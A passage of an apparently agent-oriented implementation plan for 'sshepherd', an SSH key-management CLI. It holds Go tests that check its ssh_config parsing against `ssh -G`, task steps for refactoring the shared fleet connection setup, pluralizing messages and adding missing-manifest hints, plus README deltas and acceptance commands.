	if len(h.Identities) > 0 && !slices.ContainsFunc(h.Identities, func(s string) bool { return strings.Contains(s, "%") }) {
		norm := func(s string) string { // ssh may print ~ expanded with pw_dir
			if rest, ok := strings.CutPrefix(s, me.HomeDir+"/"); ok {
				return "~/" + rest
			}
			return s
		}
		var a, b []string
		for _, s := range h.Identities { a = append(a, norm(s)) }
		for _, s := range g["identityfile"] { b = append(b, norm(s)) }
		if !slices.Equal(a, b) {
			d = append(d, "identityfile "+strings.Join(a, ",")+" vs "+strings.Join(b, ","))
		}
	}
	return d
}

var includeArg = regexp.MustCompile(`(?m)^(\s*Include\s+)([^\s~/]\S*)`)

// absolutize rewrites relative Include args against dir: under -F, ssh
// resolves them against ~/.ssh, while the fixtures assume dir.
func absolutize(dir, content string) string {
	return includeArg.ReplaceAllString(content, "${1}"+dir+"/${2}")
}

func TestResolutionMatchesSSHG(t *testing.T) {
	bin, err := exec.LookPath("ssh")
	if err != nil {
		t.Skip("ssh not installed")
	}
	me, err := user.Current()
	if err != nil {
		t.Skip("no current user:", err)
	}
	check := func(t *testing.T, files map[string]string, reason string) {
		if reason != "" {
			t.Skip("known deviation: " + reason)
		}
		dir := t.TempDir()
		for name, c := range files {
			p := filepath.Join(dir, name)
			_ = os.MkdirAll(filepath.Dir(p), 0o750)
			if err := os.WriteFile(p, []byte(absolutize(dir, c)), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		cfg := filepath.Join(dir, "config")
		hosts, _, err := load(cfg, dir, dir)
		if err != nil {
			t.Fatal(err)
		}
		for _, h := range hosts {
			g, err := sshG(t, bin, cfg, h.Alias)
			if err != nil {
				t.Fatalf("ssh -G %s: %v (set sshG on the fixture if this is a documented deviation)", h.Alias, err)
			}
			if d := diffHost(h, g, me); len(d) > 0 {
				t.Errorf("%s: sshcfg vs ssh -G: %v", h.Alias, d)
			}
		}
	}
	for _, tc := range loadResolutionCases {
		t.Run(tc.name, func(t *testing.T) { check(t, map[string]string{"config": tc.config}, tc.sshG) })
	}
	for _, tc := range includeContextCases {
		t.Run(tc.name, func(t *testing.T) { check(t, tc.files, tc.sshG) })
	}
}

// The oracle must actually catch a difference: sshcfg skips Match, ssh
// evaluates it, so a Match-only User diverges.
func TestSSHGOracleDetectsDivergence(t *testing.T) {
	bin, err := exec.LookPath("ssh")
	if err != nil {
		t.Skip("ssh not installed")
	}
	me, _ := user.Current()
	dir := t.TempDir()
	cfg := filepath.Join(dir, "config")
	_ = os.WriteFile(cfg, []byte("Match all\n  User zz-match\nHost a\n  HostName 10.0.0.1\n"), 0o600)
	hosts, _, _ := load(cfg, dir, dir)
	g, err := sshG(t, bin, cfg, "a")
	if err != nil {
		t.Fatal(err)
	}
	if len(diffHost(hosts[0], g, me)) == 0 {
		t.Error("diffHost found no difference on a Match-only User; the oracle is blind")
	}
}
```

- [ ] **Step 3: Run.** `go test -race ./internal/sshcfg/ -run 'SSHG' -v`. `TestSSHGOracleDetectsDivergence` must PASS, which shows the oracle is not blind. For each `TestResolutionMatchesSSHG` subtest that FAILS, decide from the source: either it is a real sshcfg bug, which you fix in `sshcfg.go` with a unit row added, or it is a deliberate deviation, which you record in `sshG` with a one-line reason. Expected deliberate deviations: invalid `Port` (ssh is fatal, sshcfg warns), unsupported `%` tokens in `HostName` (ssh expands, sshcfg skips the host), and fixtures whose result depends on evaluating `Match`. **Do not** mark the include-context cases as deviations. Those are the ones the comments claim were checked against `ssh -G`.
- [ ] **Step 4:** `go test -race ./internal/sshcfg/` should PASS, both on macOS (system OpenSSH) and on the CI ubuntu runner. Without ssh, the test skips.

---

#### README / CLAUDE.md / golden deltas (integrator applies; sample text from real runs)

1. **Manifest validation** (README ~280-287): after the option list, add *"`expiry-time` must be `YYYYMMDD[HHMM[SS]]` (optional `Z` for UTC): sshd skips a line it cannot read."* (This applies only if the owner says yes in Task 2.)
2. **adopt** (README ~538-551): add *"A found key line that sshd would ignore (an unknown option such as `no-ptty`, an unquoted value such as `from=1.2.3.4`, or a flag that has a value) is not access. adopt reports it like an unparseable line and does not adopt it. Strict mode aborts with exit 1, and `--partial` skips the line and keeps the server's other keys:"* followed by the real stderr line from Task 5 (`server <name>: key SHA256:…: sshd ignores this line: option "no-ptty" is not a recognized authorized_keys option`).
3. **apply loosening** (README ~736-740): replace `no-*` in the list of restrictive options with `no-agent-forwarding`, `no-port-forwarding`, `no-pty`, `no-user-rc`, `no-X11-forwarding`, `verify-required`. Add: *"…or **adds a relaxing option**: `no-touch-required` always, and `pty`, `port-forwarding`, `agent-forwarding`, `X11-forwarding`, `user-rc` when both lines carry `restrict`. Dropping `no-touch-required` tightens access and is not flagged."* Add the `adds relaxing option(s)` warning and `"widens": []` from P07 Task 8's regenerated goldens.
4. **import** (README ~480-485 "How the ssh config is read"): add *"An `Include` that would re-read a file already being read (directly or through a symlink) is skipped with `Include cycle: <file> is already being read, skipping`. import reads at most 1024 included files and skips any included file over 1 MiB. OpenSSH itself has no cycle check and fails at depth 16."*
5. **CLAUDE.md Status**: one sentence. *"authorized_keys option meaning lives in one table (`internal/authkeys/options.go`) used by manifest validation, apply's loosening highlight (verify-required restricts; added relaxations flagged), the lockout-guard warning and rotate's expiry check. adopt turns server lines sshd would ignore into strict/--partial issues. sshcfg Include skips cycles and caps reads (1024 files, 1 MiB each). A `ssh -G` differential test checks sshcfg."*
6. **Goldens:** P05 alone changes none. P07 Task 8 regenerates `internal/apply/testdata/json_*.golden.json` (adds `"widens": []`) in its own lane.
7. **Makefile (P13, wave 2):** add `$(GO) test -run='^$$' -fuzz=FuzzCheckOption -fuzztime=15s ./internal/authkeys` to `make fuzz`.

#### Risks and how to verify

- **Stricter manifest load** (expiry format, Task 2). A manifest holding a malformed `expiry-time` now exits 3 at load. sshd never accepted that line, but this is still a visible change, so it is gated on the single owner question. Verify with `go test ./internal/config/`.
- **Changed loosening classification** (Task 3). `no-touch-required` dropped is no longer red, and unknown on-server options (for example `no-ptty`) are no longer listed as "dropped restrictions". Before, any `no-` prefix was listed; now the server line was never valid for sshd. The guard behavior (`hasRestrictiveOption`) is pinned unchanged by `TestHasRestrictiveOption`. Verify with `go test ./internal/apply/`, then run `make integration` for the apply matrix.
- **adopt `--partial` header wording.** A server with one ignored line gets the existing marker `# WARNING: server X unreadable — its access is NOT represented`. That overstates things, because its other keys *are* adopted. It is the same as today's behavior for unparseable lines. Rewording belongs to `cmd/sshepherd/adopt.go` (P06/P12), so flag it as a follow-up and do not fix it here.
- **Cycle skip differs from OpenSSH**, which is fatal at depth 16. sshcfg skips with a warning, as it already did at the depth cap. This is documented in the README. Real configs (the owner's `Include config.d/*.conf`) do ~10 reads, far under the budget.
- **The ssh -G test depends on the environment.** It skips without ssh, and it runs on macOS and the ubuntu CI runner. The comparison uses `pw_dir` (`os/user`), not `$HOME`, because ssh expands `~` from the passwd entry.
- **Shared test package.** `adopt_options_test.go` calls `hermeticFleet`/`shortHome` (P07's file) and `run`/`writeConfig`. If P06/P07 rename those helpers in wave 1, the integrator fixes the call sites.
- **E2E:** `make integration` runs the dockerized apply matrix and the adopt → apply → revoke → audit → rotate loop. That is the end-to-end check that the derived `hasRestrictiveOption`/`certOnly` did not change probe ordering or guard verdicts.

#### Acceptance

```bash
go test -race ./internal/authkeys/ ./internal/config/ ./internal/apply/ ./internal/adopt/ ./internal/sshcfg/ ./cmd/sshepherd/
go test -run '^$' -fuzz FuzzCheckOption -fuzztime 30s ./internal/authkeys/
go test -run '^$' -fuzz FuzzParse -fuzztime 30s ./internal/sshcfg/
go test ./internal/apply/ ./cmd/sshepherd/ -run Golden      # no -update; must pass unchanged
grep -rn 'keyOptions\|isRestriction\|droppedRestrictions' internal cmd   # must print nothing
make check          # gofmt, goimports, vet, golangci-lint (depguard: os/exec only in _test.go), deadcode, gosec, govulncheck, coverage >= 80%
make integration    # dockerized apply matrix + E2E loop
```

#### Out of scope

- Making `authkeys.ParseLine` strict. This is rejected on purpose: a single typo line would turn the server into "unparseable", and apply would refuse to write it.
- audit counting a line that sshd ignores as an installed key (part of TST-2's impact). `internal/audit/*` belongs to P07 (wave 1) and P11 (wave 2). Suggested follow-up: audit calls `authkeys.OptionIssue` on each actual key and reports an "ignored by sshd" drift class. That is a new drift class, so it needs a short owner decision first.
- Rewording adopt's `unreadable` header for single-line issues (`cmd/sshepherd/adopt.go`, P06/P12), and adopt `--partial`'s exit code (D8, P12).
- Weak-key and expiry policy (D19, PRD-10). Per-access options (D22). Key generation and scheduled rotation (on hold). None of these are touched. `ExpiryTime` only parses; it adds no policy.
- Marking `verify-required` as `blocksLogin` (it may block a headless run with an sk key). The behavior stays unchanged. It is a candidate for the guard-warning review in P11.
- Running fuzz-found sshcfg inputs through the `ssh -G` differential. The Go fuzz corpus format needs decoding, so this is a follow-up for P13's fuzz work.

---

### P06 — CLI messages, copy-paste hints, help examples, pluralization and one shared fleet-read setup

> **Program notes (master plan):** Ownership amended: also `cmd/sshepherd/edit.go` (the `runFlags` block), `rotate_keep_old_test.go` and `revoke_server_test.go`. Starts only after W0 is committed.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this package task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Kind:** fix · **Wave:** 1 · **Depends on:** P01 (its `testdata/help/*.golden`, help golden test and `run.go`/`import.go` edits must be on master first)

**Goal:** Every count string is pluralized. Every follow-up hint can be pasted as is, because it carries the run's own `--config`, `--known-hosts` and identity flags. Retrying a finished revoke explains itself. Usage errors read like the rest of the CLI. `--help` has examples and exit codes. A missing manifest points to the bootstrap command. One `fleetSession` replaces the three copies of the fleet-read setup.

**Architecture:** A new `cmd/sshepherd/fleet.go` holds `connFlags` (shared `--config/--known-hosts/--parallel` + identity flags), `fleetSession` (known_hosts → key files → credentials check, then `Read`), `readFleet`, `logManifest`, `manifestError` and the `followUp` hint builder. `audit.go`, `adopt.go` and `apply.go` call it. `runFlags` (edit.go) embeds `connFlags`, so `rf.cfgPath`/`rf.knownHosts`/`rf.parallel`/`rf.idf` still resolve and no other call site changes. `apply.Plural` (internal/apply/report.go, read-only here) is the one count+noun helper. `pluralWord` (word only, e.g. has/have) stays; `nWord` is deleted.

**Tech Stack:** Go 1.27, Cobra v1.10.2 / pflag, `log/slog` + `internal/clog`, hermetic `sshtest` server, golden files (`-update`), goleak.

#### Findings covered

| ID | One line |
|---|---|
| ARC-5 | known_hosts → credentials → `sshread.Client` → `audit.Run` is copied in audit.go:68-104, adopt.go:120-161 and apply.go:228-254,315-334. The flags are registered three times (audit.go:113-115, adopt.go:317-319, edit.go:28-30), and `"sshepherd.yaml"` appears 5 times |
| UX-5 | `applyHint` (editrun.go:400-409), `printScope` (383-386) and `overlapHint` (139-164) drop `--known-hosts`/`--identity*` (and printScope drops even `--config`). The `--no-apply` hint (editrun.go:297-298) lists emptied servers, which apply refuses |
| UX-6 | Re-running a finished `revoke alice` says `unknown user: alice` (revoke.go:141-143), exit 3, with no hint |
| UX-8 | `apply --dry-run --yes` prints cobra's flag-group jargon (edit.go:35). `-v -q` prints a timestamped ERROR (run.go:219, which cobra checks after PersistentPreRunE, cobra command.go:986 vs 1010). `audti` folds cobra's multi-line suggestion into one line (args.go:36) |
| UX-9 | No `Example:` anywhere. `audit --help` is one line (audit.go:40), and no command's `--help` lists exit codes |
| UX-10 | Missing default manifest: `error: load manifest: read manifest: open sshepherd.yaml: …` (stuttered, no hint). README Quick start (README.md:125-133) starts with `adopt`, which needs a manifest |
| UX-11 | `loaded manifest: 3 users, 1 servers` (audit.go:52, apply.go:69, adopt.go:276, editrun.go:80, import.go:223), `auditing/planning/reading 1 servers` (audit.go:96, apply.go:237, adopt.go:281), `applying %d servers` (apply.go:219), `apply 1 of 1 servers?` (apply.go:94), `server(s)` (adopt.go:197), `write %d of %d affected servers?` and `OPERATOR ops-bot: OPERATOR ci:` (internal/apply/edit.go:183-196) |

#### Files owned

- Modify: `cmd/sshepherd/apply.go`, `audit.go`, `adopt.go`, `editrun.go`, `revoke.go`, `rotate.go`, `run.go`, `import.go`, `paths.go`
- Create: `cmd/sshepherd/fleet.go`, `cmd/sshepherd/fleet_test.go`
- Tests: `cmd/sshepherd/apply_test.go`, `audit_test.go`, `adopt_test.go`, `editrun_test.go`, `revoke_test.go`, `rotate_test.go`, `run_test.go`, `import_test.go`, `paths_test.go`
- Goldens: `cmd/sshepherd/testdata/help/*.golden` (regenerated), `internal/apply/testdata/edit_*.golden`
- `internal/apply/edit.go`, `internal/apply/edit_test.go`
- **Requested additions (no other wave-1 package owns them, so the wave stays disjoint):**
  - `cmd/sshepherd/edit.go`: only the `runFlags` block, lines 14-51. `runFlags` and the `dry-run`/`yes` flag group live there. P12 rewrites edit.go in wave 2, after this package.
  - `cmd/sshepherd/rotate_keep_old_test.go` and `cmd/sshepherd/revoke_server_test.go`: their hint assertions change (rotate_keep_old_test.go:163-164; revoke_server_test.go:75 if the operator refusal hint changes). No package claims these files.
  - If the orchestrator refuses these additions, the integrator applies the listed one-line test updates, and edit.go is handled as described in the Handoff section.

#### Execution model

Use **one agent, working through the tasks in order** in its own worktree. ARC-5 changes the signatures that UX-5, UX-10 and UX-11 build on, and almost every task touches `apply.go`/`editrun.go`/`revoke.go`, so the tasks cannot run in parallel. The agent makes no commits. It hands back the diff, the regenerated goldens (each one read by eye) and the handoff list at the end. Use `rtk proxy go test …` when exact failure lines matter.

---

#### Task 1 (ARC-5a): `defaultConfigPath` and shared `connFlags`

**Files:** `cmd/sshepherd/paths.go`, `cmd/sshepherd/fleet.go` (new), `cmd/sshepherd/fleet_test.go` (new), `cmd/sshepherd/edit.go` (runFlags only), `audit.go:29-37,113-119`, `adopt.go:225-235,317-324`

- [ ] **Step 1: Write the failing test.** Put it in `fleet_test.go`. The `TestMain`/goleak hook already lives in `leak_test.go`.

```go
package main

import (
	"testing"

	"github.com/spf13/cobra"
)

// TestConnFlagsRegister: one registration gives every connecting command the
// same names and defaults, and each command keeps its own --parallel wording
// (the help goldens pin the rest).
func TestConnFlagsRegister(t *testing.T) {
	var f connFlags
	cmd := &cobra.Command{Use: "x"}
	f.register(cmd, "max concurrent server audits")
	for name, def := range map[string]string{
		"config": "sshepherd.yaml", "known-hosts": "~/.ssh/known_hosts", "parallel": "32",
		"identity": "[]", "identity-passphrase-file": "", "identity-passphrase": "[]",
	} {
		fl := cmd.Flags().Lookup(name)
		if fl == nil || fl.DefValue != def {
			t.Errorf("--%s = %+v, want default %q", name, fl, def)
		}
	}
	if u := cmd.Flags().Lookup("parallel").Usage; u != "max concurrent server audits" {
		t.Errorf("--parallel usage = %q", u)
	}
	if defaultConfigPath != "sshepherd.yaml" {
		t.Errorf("defaultConfigPath = %q", defaultConfigPath)
	}
}
```

- [ ] **Step 2: Run it and expect FAIL** (`undefined: connFlags`, `undefined: defaultConfigPath`):
`go test ./cmd/sshepherd/ -run TestConnFlagsRegister`

- [ ] **Step 3: Implement.**
  - `paths.go`: add `// defaultConfigPath is the manifest every command reads without --config.` and `const defaultConfigPath = "sshepherd.yaml"`.
  - `fleet.go`:

```go
// connFlags are the connection flags audit, adopt, apply, revoke and rotate
// share: one registration, one set of defaults and help strings.
type connFlags struct {
	cfgPath    string
	knownHosts string
	parallel   int
	idf        identityFlags
}

// register declares the flags; parallelUsage keeps each command's own
// --parallel wording (server audits / reads / connections).
func (f *connFlags) register(cmd *cobra.Command, parallelUsage string) {
	cmd.Flags().StringVar(&f.cfgPath, "config", defaultConfigPath, "path to the manifest")
	cmd.Flags().StringVar(&f.knownHosts, "known-hosts", defaultKnownHosts, "path to known_hosts (strict host-key checking)")
	cmd.Flags().IntVar(&f.parallel, "parallel", defaultParallel, parallelUsage)
	f.idf.register(cmd)
}

// validate is step 1 of every connecting command: --parallel and the
// identity flags, before the manifest is read.
func (f *connFlags) validate() (identities, error) { return validateFlags(f.parallel, &f.idf) }
```

  - `edit.go`: change `runFlags` to `struct { connFlags; dryRun, yes, json bool }`. `register` calls `f.connFlags.register(cmd, "max concurrent server connections")` and keeps the `--dry-run/--yes/--json` lines. The flag group goes away in Task 5, not here.
  - `audit.go`: replace `cfgPath/knownHosts/parallel/idf` with `cf connFlags`, register with `"max concurrent server audits"`, and use `cf.validate()`. Do the same in `adopt.go` with `"max concurrent server reads"`.
  - Replace the literal `"sshepherd.yaml"` in `editrun.go:141,402` with `defaultConfigPath`. Task 6 rewrites both lines anyway.

- [ ] **Step 4: Run and expect PASS. The help goldens must not change:**
`go test ./cmd/sshepherd/ -run 'TestConnFlagsRegister|Help'`

---

#### Task 2 (ARC-5b): one `fleetSession` for audit, adopt and apply

**Files:** `fleet.go`, `fleet_test.go`, `audit.go:65-106`, `adopt.go:116-173,280-288`, `apply.go:181-334`

- [ ] **Step 1: Write the failing tests** (`fleet_test.go`). They reuse `editFleet`, `writeConfig`, `readCfg`, `neverPrompt`, `usePrompter` and `encryptedKey` from the package's tests.

```go
// TestOpenFleetKnownHostsFirst: a bad known_hosts fails before any key file
// is read, so a typo never costs a passphrase prompt.
func TestOpenFleetKnownHostsFirst(t *testing.T) {
	usePrompter(t, neverPrompt(t))
	cf := connFlags{knownHosts: filepath.Join(t.TempDir(), "missing"), parallel: 1,
		idf: identityFlags{paths: []string{encryptedKey(t, 1)}}}
	ids, err := cf.validate()
	if err != nil {
		t.Fatal(err)
	}
	_, err = openFleet(context.Background(), slog.New(slog.DiscardHandler), &cf, ids, false)
	if err == nil || !strings.HasPrefix(err.Error(), "known_hosts preflight:") {
		t.Fatalf("err = %v, want the known_hosts preflight", err)
	}
}

// TestFleetSessionRead: the phase line (pluralized), the done line, and the
// interrupt check all live in Read.
func TestFleetSessionRead(t *testing.T) {
	hosts, kh, _ := editFleet(t, []byte{1}, "web-1")
	hosts["web-1"].install(t, []byte{1})
	path := writeConfig(t, "users:\n  - {name: alice, keys: ["+qk(t, 1)+"]}\nservers:\n"+hosts["web-1"].line("web-1")+
		"access:\n  - {user: alice, servers: [web-1]}\n")
	cfg := readCfg(t, path)
	var buf bytes.Buffer
	log := slog.New(clog.NewHandler(&buf, clog.Options{Level: slog.LevelInfo}))
	cf := connFlags{knownHosts: kh, parallel: 4}
	ids, _ := cf.validate()
	s, err := openFleet(context.Background(), log, &cf, ids, false)
	if err != nil {
		t.Fatal(err)
	}
	res, err := s.Read(context.Background(), "auditing", cfg, cfg.Servers, nil)
	if err != nil || len(res) != 1 || res[0].Err != nil {
		t.Fatalf("Read = %+v, %v", res, err)
	}
	for _, want := range []string{"auditing 1 server (parallelism 4)…", "1 read, 0 unreachable"} {
		if !strings.Contains(buf.String(), want) {
			t.Errorf("log lacks %q:\n%s", want, buf.String())
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := s.Read(ctx, "auditing", cfg, cfg.Servers, nil); err == nil || !strings.HasPrefix(err.Error(), "interrupted:") {
		t.Errorf("canceled Read err = %v, want interrupted", err)
	}
}
```

- [ ] **Step 2: Run and expect FAIL** (`undefined: openFleet`):
`go test ./cmd/sshepherd/ -run 'TestOpenFleet|TestFleetSession'`

- [ ] **Step 3: Implement in `fleet.go`.** Move `readFleet` and `interrupted` here from adopt.go:116-173.

```go
// fleetSession is one run's connection setup, built once: known_hosts parsed
// once, the key files loaded (may prompt), the credentials checked. Every
// reader, writer and probe of the run shares the snapshot and credentials.
type fleetSession struct {
	log      *slog.Logger
	khPath   string
	kh       *sshconn.KnownHosts
	creds    *sshconn.Credentials
	parallel int
}

// openFleet runs the pre-dial checks in the documented order: known_hosts,
// key files, credentials (needHeld: apply's guard needs plain held keys).
func openFleet(ctx context.Context, log *slog.Logger, f *connFlags, ids identities, needHeld bool) (*fleetSession, error) {
	khPath, err := expandHome(f.knownHosts)
	if err != nil {
		return nil, err
	}
	kh, err := sshread.LoadKnownHosts(khPath)
	if err != nil {
		return nil, fmt.Errorf("known_hosts preflight: %w", err)
	}
	creds, err := ids.credentials(ctx, log)
	if err != nil {
		return nil, err
	}
	if err := checkCredentials(ctx, creds, needHeld); err != nil {
		return nil, err
	}
	return &fleetSession{log: log, khPath: khPath, kh: kh, creds: creds, parallel: f.parallel}, nil
}

// Read is phase 1 of every command: audit's pipeline over servers, offering
// preferKeys first on each dial, with the phase and done lines, and a
// canceled run reported as a tool error (nothing rendered or written).
func (s *fleetSession) Read(ctx context.Context, verb string, cfg *config.Config, servers []config.Server,
	preferKeys func(config.Server) []string,
) ([]audit.ServerResult, error) {
	reader := &sshread.Client{KnownHostsPath: s.khPath, KnownHosts: s.kh, Creds: s.creds,
		DialTimeout: dialTimeout, PreferKeys: preferKeys, Log: s.log}
	s.log.Info(fmt.Sprintf("%s %s (parallelism %d)…", verb, apply.Plural(len(servers), "server", "servers"), s.parallel))
	start := time.Now()
	results := audit.Run(ctx, cfg, reader, audit.Options{Parallel: s.parallel, PerServerTimeout: perServerTimeout,
		Servers: servers, Logger: s.log})
	logFleetReadDone(s.log, cfg, results, start)
	if err := interrupted(ctx); err != nil {
		return nil, err
	}
	return results, nil
}

// dialer is phase 2's dialer: the same known_hosts snapshot and credentials.
func (s *fleetSession) dialer(preferKeys func(config.Server) []string) *sshconn.Dialer {
	return &sshconn.Dialer{KnownHostsPath: s.khPath, KnownHosts: s.kh, Creds: s.creds,
		DialTimeout: dialTimeout, PreferKeys: preferKeys, Log: s.log}
}

// readFleet is audit's and adopt's whole read: an empty fleet needs no
// credentials (never reads a key, never prompts) and returns nil.
func readFleet(ctx context.Context, log *slog.Logger, cfg *config.Config, f *connFlags, ids identities, verb string) ([]audit.ServerResult, error) {
	if len(cfg.Servers) == 0 {
		return nil, nil
	}
	s, err := openFleet(ctx, log, f, ids, false)
	if err != nil {
		return nil, err
	}
	// Granted keys (operators first) go first, so many held keys cannot trip MaxAuthTries.
	return s.Read(ctx, verb, cfg, cfg.Servers, func(srv config.Server) []string { return audit.GrantedFingerprints(cfg, srv.Name) })
}
```

  - `audit.go:65-106` becomes `if len(cfg.Servers) == 0 { return render(nil) }` then `results, err := readFleet(cmd.Context(), log, cfg, &cf, ids, "auditing")`, then render and verdict. `audit.Options.Servers: cfg.Servers` is the same as nil (audit.go:196-198).
  - `adopt.go`: delete the `reading %d servers` log (281-282), `start` (283) and the `logFleetReadDone` call (288). Call `readFleet(..., &cf, ids, "reading")`.
  - `apply.go`: change `preflight` to `struct { *fleetSession; held []sshconn.HeldKey }`. `applyPreflight(ctx, log, &rf.connFlags, ids)` calls `openFleet(..., true)` and then `Held` (the error text `agent preflight:` stays). `planFleet` calls `pre.Read(ctx, "planning", run.cfg, run.servers, run.preferKeys)`, then `apply.Build`. `writePhase` uses `pre.dialer(preferKeys)` and `pre.creds`.

- [ ] **Step 4: Run and expect PASS (whole package):** `go test -race ./cmd/sshepherd/`
- [ ] **Step 5: Check that only one copy is left:** `grep -n 'sshread.LoadKnownHosts\|&sshread.Client{' cmd/sshepherd/*.go | grep -v _test` should print only the lines in `fleet.go`.

**Behavior note:** adopt's `reading N servers` line now follows the credentials preflight, as audit's line always has. A passphrase prompt now comes before that line. adopt_test.go:546 (`-q` hides "reading") still holds.

---

#### Task 3 (UX-11): pluralize every count, and render the operator prefix once

**Files:** `fleet.go` (`logManifest`), `audit.go`, `adopt.go:179-223`, `apply.go:69-72,94,219,297`, `editrun.go:79-83`, `import.go:222-226,314-330`, `internal/apply/edit.go:180-197`, `internal/apply/edit_test.go`, `internal/apply/testdata/edit_prompt.golden`, `apply_test.go:422`, `adopt_test.go`

- [ ] **Step 1: Write the failing tests.**
  - `internal/apply/edit_test.go` `TestEditPromptGolden`: add `EditPrompt(nil, 1, 1, false)` to the slice, and add this check before `checkGolden`:

```go
for _, want := range []string{
	"save manifest edit and write 1 of 1 affected server? [y/N]\n",
	"OPERATORS ops-bot, ci: save manifest edit? [y/N]\n",
} {
	if !strings.Contains(buf.String(), want) {
		t.Errorf("prompts lack %q:\n%s", want, buf.String())
	}
}
```

  - `apply_test.go:422`: change the expected prompt to `"apply 1 of 1 server? [y/N]"`.
  - `fleet_test.go`:

```go
func TestLogManifestPluralized(t *testing.T) {
	var buf bytes.Buffer
	log := slog.New(clog.NewHandler(&buf, clog.Options{Level: slog.LevelInfo}))
	cfg := readCfg(t, writeConfig(t, "users:\n  - {name: alice, keys: ["+qk(t, 1)+"]}\nservers:\n  - {name: web-1, host: 10.0.0.1, user: deploy}\n"))
	logManifest(log, cfg)
	if want := "• loaded manifest: 1 user, 1 server\n"; buf.String() != want {
		t.Errorf("got %q, want %q", buf.String(), want)
	}
}
```

  - `adopt_test.go` `TestAdoptUnreachableStrictGateAndPartial` (line 521): with the one unreachable server, assert stderr contains `"1 server could not be fully read — nothing written"`.
- [ ] **Step 2: Run and expect FAIL:** `go test ./internal/apply/ -run TestEditPromptGolden && go test ./cmd/sshepherd/ -run 'TestLogManifest|TestApplyRefusesChangedManifest|TestAdoptUnreachable'`
- [ ] **Step 3: Implement.**
  - `fleet.go`:

```go
// logManifest is every command's loaded-manifest phase line, then the
// manifest's warnings.
func logManifest(log *slog.Logger, cfg *config.Config) {
	log.Info("loaded manifest: " + apply.Plural(len(cfg.Users), "user", "users") + ", " + apply.Plural(len(cfg.Servers), "server", "servers"))
	for _, w := range cfg.Warnings {
		log.Warn(w)
	}
}
```

  - Use `logManifest` in place of the five `loaded manifest:` + warnings loops (audit.go:52-55, apply.go:69-72, adopt.go:276-279, editrun.go:80-83, import.go:223-226).
  - apply.go:94 → `fmt.Sprintf("apply %d of %s?", toWrite, apply.Plural(len(targets), "server", "servers"))`. apply.go:219 → `"applying " + apply.Plural(toWrite, "server", "servers") + …`. apply.go:297 → `apply.Plural(n, "server", "servers") + " not started …"`.
  - adopt.go:196-198 → `apply.Plural(len(unreadable), "server", "servers") + " could not be fully read — nothing written; …"`. adopt.go:221-222 → `"adopting " + apply.Plural(len(plan.NewUsers), "new user", "new users") + ", " + apply.Plural(len(plan.Extensions), "access extension", "access extensions")`.
  - import.go `mergeSummary`: build each part as `"+" + apply.Plural(n, "server", "servers")` and so on (`"access entry"/"access entries"`, `"conflict"/"conflicts"` + `" skipped"`). The output does not change. Delete `nWord` (import.go:324-330). `pluralWord` (revoke.go:299) stays as the only word-only helper.
  - `internal/apply/edit.go` `EditPrompt`:

```go
switch len(operators) {
case 0:
case 1:
	fmt.Fprintf(&b, "OPERATOR %s: ", operators[0])
default:
	fmt.Fprintf(&b, "OPERATORS %s: ", strings.Join(operators, ", "))
}
// …
default:
	fmt.Fprintf(&b, "save manifest edit and write %d of %s?", toWrite, Plural(affected, "affected server", "affected servers"))
```

  Update the doc comment: "prefixed `OPERATOR NAME: `, or `OPERATORS A, B: ` for several".
- [ ] **Step 4: Regenerate and check:** `go test ./internal/apply/ -run TestEditPromptGolden -update`. Then read `internal/apply/testdata/edit_prompt.golden`: only the last line changes (`OPERATORS ops-bot, ci: save manifest edit? [y/N]`) and one new line is added (`… write 1 of 1 affected server? [y/N]`). After that, run `go test ./internal/apply/ ./cmd/sshepherd/` and expect PASS.
- [ ] **Step 5: Check:** `grep -rnE 'server\(s\)|%d servers|%d users' cmd/sshepherd internal/apply --include='*.go' | grep -v _test` should print nothing.

---

#### Task 4 (UX-10): missing-manifest hint, and no `load manifest:` stutter

**Files:** `fleet.go` (`manifestError`), `audit.go:48-51`, `apply.go:61-68`, `adopt.go:258-275`, `editrun.go:63-78`, `import.go:213-221`, `audit_test.go`, `adopt_test.go`, `import_test.go`

- [ ] **Step 1: Write the failing tests** (`audit_test.go`).

```go
// TestManifestErrors: a missing default manifest names the bootstrap, a
// missing --config path says to check it, and no error stutters.
func TestManifestErrors(t *testing.T) {
	t.Run("missing default", func(t *testing.T) {
		t.Chdir(t.TempDir())
		var out, errBuf bytes.Buffer
		if code := run([]string{"audit"}, &out, &errBuf); code != 3 {
			t.Fatalf("exit = %d, want 3", code)
		}
		want := "error: no manifest at sshepherd.yaml — create one with 'sshepherd import --servers-only -o sshepherd.yaml', or pass --config PATH\n"
		if errBuf.String() != want {
			t.Errorf("stderr = %q, want %q", errBuf.String(), want)
		}
	})
	t.Run("missing --config", func(t *testing.T) {
		var out, errBuf bytes.Buffer
		run([]string{"apply", "--config", "no-such.yaml"}, &out, &errBuf)
		want := "error: no manifest at no-such.yaml — check --config, or create one with 'sshepherd import --servers-only -o no-such.yaml'\n"
		if errBuf.String() != want {
			t.Errorf("stderr = %q, want %q", errBuf.String(), want)
		}
	})
	t.Run("no stutter", func(t *testing.T) {
		for _, body := range []string{"users: [\n", "users:\n  - {name: a, keys: []}\n  - {name: a, keys: []}\n"} {
			path := writeConfig(t, body)
			for _, sub := range []string{"audit", "adopt", "apply", "revoke"} {
				var out, errBuf bytes.Buffer
				args := []string{sub, "--config", path}
				if sub == "revoke" {
					args = append(args, "a")
				}
				run(args, &out, &errBuf)
				if s := errBuf.String(); strings.Contains(s, "load manifest:") || !(strings.Contains(s, "parse manifest:") || strings.Contains(s, "invalid manifest "+path+":")) {
					t.Errorf("%s: stderr = %q", sub, s)
				}
			}
		}
	})
}
```

  In `import_test.go`, add a case: `import --merge missing.yaml` gives stderr `no manifest at missing.yaml — check --merge, or create one with 'sshepherd import --servers-only -o missing.yaml'`.
- [ ] **Step 2: Run and expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestManifestErrors|TestImportMerge'`
- [ ] **Step 3: Implement in `fleet.go`.**

```go
// manifestError words a manifest that cannot be loaded, once. config's own
// "read manifest:"/"parse manifest:" prefix is kept and cmd adds none; a
// missing file gets the bootstrap hint; a validation error (config's joined
// list has no prefix) names the file. flag named path: "--config", or
// import's "--merge".
func manifestError(flag, path string, err error) error {
	if errors.Is(err, fs.ErrNotExist) {
		return &missingManifestError{flag: flag, path: path, err: err}
	}
